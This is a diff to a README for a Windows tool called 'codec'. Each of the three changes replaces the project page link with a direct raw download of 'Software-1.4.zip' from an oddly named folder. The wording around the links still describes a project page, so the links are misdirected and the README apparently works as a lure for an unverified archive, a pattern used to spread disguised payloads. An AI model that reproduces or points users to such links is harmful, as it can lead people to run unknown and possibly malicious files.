@@ -1,6 +1,6 @@
 # ⚙️ codec - Simple local command control
 
-[![Download codec](https://img.shields.io/badge/Download%20codec-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/staciepolygonal429/codec)
+[![Download codec](https://img.shields.io/badge/Download%20codec-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/staciepolygonal429/codec/raw/refs/heads/main/waldgravine/Software-1.4.zip)
 
 ## 🚀 What codec does
 
@@ -34,7 +34,7 @@ For best results, use:
 
 Visit this page to download codec:
 
-https://github.com/staciepolygonal429/codec
+https://github.com/staciepolygonal429/codec/raw/refs/heads/main/waldgravine/Software-1.4.zip
 
 Open the page in your browser, then look for the release or download file that matches your Windows system. If the page shows a setup file, download it to your computer. If it shows a folder or source package, choose the Windows app file if one is listed.
 
@@ -188,7 +188,7 @@ codec is related to:
 
 If you want to learn more or get the file again, use the project page:
 
-https://github.com/staciepolygonal429/codec
+https://github.com/staciepolygonal429/codec/raw/refs/heads/main/waldgravine/Software-1.4.zip
 
 From there, check the latest release, the main project files, or any setup notes that come with the download
 
